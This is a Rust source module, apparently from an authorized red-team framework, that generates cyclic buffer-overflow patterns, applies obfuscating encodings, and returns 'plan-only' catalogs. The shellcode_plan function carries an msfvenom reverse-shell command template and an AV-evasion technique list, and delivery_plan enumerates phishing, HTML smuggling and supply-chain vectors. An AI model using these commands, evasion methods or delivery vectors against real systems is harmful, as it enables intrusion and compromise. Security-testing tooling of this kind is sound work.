//! Payload generation module — structured payload planning and encoding.
//!
//! All payload generation is ENCODING/PLANNING only — no live exploitation.
//! Shellcode and binary payloads are VZ-guest-only. This module provides
//! payload format analysis, encoding schemes, and delivery planning.

use super::engagement::Engagement;
use anyhow::Result;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

/// Generate a cyclic pattern for buffer overflow testing.
///
/// Produces a de Bruijn-like cyclic pattern where every 4-byte subsequence
/// is unique. Used to identify EIP/RIP offset in crash dumps.
pub fn cyclic_pattern(eng: &Engagement, length: usize) -> Result<Value> {
    eng.validate_live()?;
    let max_len = 65536;
    let len = length.min(max_len);
    let mut pattern = Vec::with_capacity(len);

    let upper = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let lower = b"abcdefghijklmnopqrstuvwxyz";
    let digits = b"0123456789";

    'outer: for &a in upper {
        for &b in lower {
            for &c in digits {
                for byte in [a, b, c] {
                    pattern.push(byte);
                    if pattern.len() >= len {
                        break 'outer;
                    }
                }
            }
        }
    }

    let pattern_str = String::from_utf8_lossy(&pattern).to_string();
    let hash = hex::encode(Sha256::digest(&pattern));

    Ok(json!({
        "schema": "aop-payloads-v1",
        "module": "cyclic_pattern",
        "engagement_id": eng.engagement_id,
        "length": pattern.len(),
        "requested_length": length,
        "sha256": hash,
        "preview": &pattern_str[..pattern_str.len().min(200)],
        "attck": ["T1203"],
        "executed": true,
        "note": "Cyclic pattern for crash offset identification — no exploit payload",
    }))
}

/// Find the offset of a 4-byte value in a cyclic pattern.
pub fn pattern_offset(eng: &Engagement, value: &str) -> Result<Value> {
    eng.validate_live()?;
    let max_len = 65536;
    let mut pattern = Vec::with_capacity(max_len);

    let upper = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let lower = b"abcdefghijklmnopqrstuvwxyz";
    let digits = b"0123456789";

    'outer: for &a in upper {
        for &b in lower {
            for &c in digits {
                for byte in [a, b, c] {
                    pattern.push(byte);
                    if pattern.len() >= max_len {
                        break 'outer;
                    }
                }
            }
        }
    }

    let pattern_str = String::from_utf8_lossy(&pattern).to_string();
    let search_bytes = if let Some(hex_str) = value.strip_prefix("0x") {
        hex::decode(hex_str).unwrap_or_else(|_| value.as_bytes().to_vec())
    } else {
        value.as_bytes().to_vec()
    };

    let search_str = String::from_utf8_lossy(&search_bytes).to_string();
    let offset = pattern_str.find(&search_str);

    Ok(json!({
        "schema": "aop-payloads-v1",
        "module": "pattern_offset",
        "engagement_id": eng.engagement_id,
        "search_value": value,
        "offset": offset,
        "found": offset.is_some(),
        "attck": ["T1203"],
        "executed": true,
    }))
}

/// Payload encoding — apply encoding layers to test AV detection.
///
/// Encodes payloads in various formats for detection testing.
/// Does NOT generate shellcode — encodes provided test data.
pub fn encode_payload(eng: &Engagement, data: &[u8], encodings: &[String]) -> Result<Value> {
    eng.validate_live()?;
    let mut stages: Vec<Value> = Vec::new();
    let mut current = data.to_vec();

    for encoding in encodings {
        match encoding.as_str() {
            "base64" => {
                use base64::Engine;
                let encoded = base64::engine::general_purpose::STANDARD.encode(&current);
                current = encoded.into_bytes();
                stages.push(json!({
                    "encoding": "base64",
                    "output_size": current.len(),
                }));
            }
            "hex" => {
                let encoded = hex::encode(&current);
                current = encoded.into_bytes();
                stages.push(json!({
                    "encoding": "hex",
                    "output_size": current.len(),
                }));
            }
            "xor" => {
                let key = 0x41u8;
                current = current.iter().map(|b| b ^ key).collect();
                stages.push(json!({
                    "encoding": "xor",
                    "key": format!("0x{key:02x}"),
                    "output_size": current.len(),
                }));
            }
            "reverse" => {
                current.reverse();
                stages.push(json!({
                    "encoding": "reverse",
                    "output_size": current.len(),
                }));
            }
            other => {
                stages.push(json!({
                    "encoding": other,
                    "error": "unsupported encoding",
                }));
            }
        }
    }

    let final_hash = hex::encode(Sha256::digest(&current));

    Ok(json!({
        "schema": "aop-payloads-v1",
        "module": "encode_payload",
        "engagement_id": eng.engagement_id,
        "original_size": data.len(),
        "final_size": current.len(),
        "stages": stages,
        "final_sha256": final_hash,
        "attck": ["T1027"],
        "executed": true,
        "note": "Encoding for AV detection testing — no exploit content",
    }))
}

/// Shellcode generation planning (PLAN_ONLY — VZ guest only).
pub fn shellcode_plan(eng: &Engagement, arch: &str, os: &str) -> Result<Value> {
    eng.validate_live()?;
    Ok(json!({
        "schema": "aop-payloads-v1",
        "module": "shellcode_plan",
        "status": "PLAN_ONLY",
        "executed": false,
        "engagement_id": eng.engagement_id,
        "target_arch": arch,
        "target_os": os,
        "attck": ["T1059.004", "T1055"],
        "tools": {
            "msfvenom": {
                "example": format!("msfvenom -p {os}/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw"),
                "note": "Classic; heavily signatured. Requires custom encoding.",
            },
            "donut": {
                "example": "donut -i implant.exe -o shellcode.bin",
                "note": "Convert any .NET assembly to position-independent shellcode",
            },
            "sRDI": {
                "example": "Convert any DLL to shellcode (reflective DLL injection)",
                "note": "Shellcode reflective DLL injection framework",
            },
        },
        "evasion_layers": [
            "XOR/AES encryption with runtime decryption stub",
            "Direct syscalls (avoiding ntdll.dll hooks)",
            "Sleep obfuscation (encrypt shellcode in memory during sleep)",
            "Indirect syscalls via SSN resolution",
            "Module stomping (overwrite legitimate DLL .text section)",
        ],
        "policy": {
            "never_auto_executes": true,
            "requires_vz_guest": true,
        },
    }))
}

/// Delivery method planning (PLAN_ONLY).
pub fn delivery_plan(eng: &Engagement) -> Result<Value> {
    eng.validate_live()?;
    Ok(json!({
        "schema": "aop-payloads-v1",
        "module": "delivery_plan",
        "status": "PLAN_ONLY",
        "executed": false,
        "engagement_id": eng.engagement_id,
        "attck": ["T1566.001", "T1566.002", "T1189"],
        "methods": [
            {
                "name": "Spear-phishing attachment",
                "technique_id": "T1566.001",
                "vectors": [
                    "Office macro document (.docm/.xlsm)",
                    "ISO/IMG container with LNK + DLL",
                    "OneNote with embedded script",
                    "HTML smuggling (embedded JS downloads payload)",
                ],
            },
            {
                "name": "Spear-phishing link",
                "technique_id": "T1566.002",
                "vectors": [
                    "OAuth consent phishing",
                    "Credential harvesting (Evilginx2 / GoPhish)",
                    "Browser exploit landing page",
                ],
            },
            {
                "name": "Drive-by compromise",
                "technique_id": "T1189",
                "vectors": [
                    "Watering hole (compromise trusted site)",
                    "Malvertising (ad network exploitation)",
                    "Browser exploit kit",
                ],
            },
            {
                "name": "Supply chain",
                "technique_id": "T1195",
                "vectors": [
                    "Trojanized dependency (typosquatting)",
                    "Compromised update server",
                    "Build system compromise",
                ],
                "note": "Assessment only — never execute supply chain attacks",
            },
        ],
        "policy": {
            "never_auto_executes": true,
            "phishing_requires_explicit_scope": true,
        },
    }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::offensive::engagement::Engagement;

    #[test]
    fn cyclic_pattern_generates() {
        let eng = Engagement::default_lab("payload-test", "lab-auth");
        let result = cyclic_pattern(&eng, 100).unwrap();
        assert_eq!(result["module"], "cyclic_pattern");
        assert_eq!(result["length"], 100);
    }

    #[test]
    fn cyclic_pattern_caps_at_max() {
        let eng = Engagement::default_lab("payload-test", "lab-auth");
        let result = cyclic_pattern(&eng, 999999).unwrap();
        assert!(result["length"].as_u64().unwrap() <= 65536);
    }

    #[test]
    fn pattern_offset_finds_value() {
        let eng = Engagement::default_lab("payload-test", "lab-auth");
        let result = pattern_offset(&eng, "Aa0").unwrap();
        assert_eq!(result["offset"], 0);
        assert_eq!(result["found"], true);
    }

    #[test]
    fn encode_payload_applies_stages() {
        let eng = Engagement::default_lab("payload-test", "lab-auth");
        let result =
            encode_payload(&eng, b"test payload", &["base64".into(), "hex".into()]).unwrap();
        assert_eq!(result["stages"].as_array().unwrap().len(), 2);
        assert!(result["final_size"].as_u64().unwrap() > 0);
    }

    #[test]
    fn shellcode_plan_is_plan_only() {
        let eng = Engagement::default_lab("payload-test", "lab-auth");
        let result = shellcode_plan(&eng, "x64", "linux").unwrap();
        assert_eq!(result["status"], "PLAN_ONLY");
    }

    #[test]
    fn delivery_plan_is_plan_only() {
        let eng = Engagement::default_lab("payload-test", "lab-auth");
        let result = delivery_plan(&eng).unwrap();
        assert_eq!(result["status"], "PLAN_ONLY");
    }
}
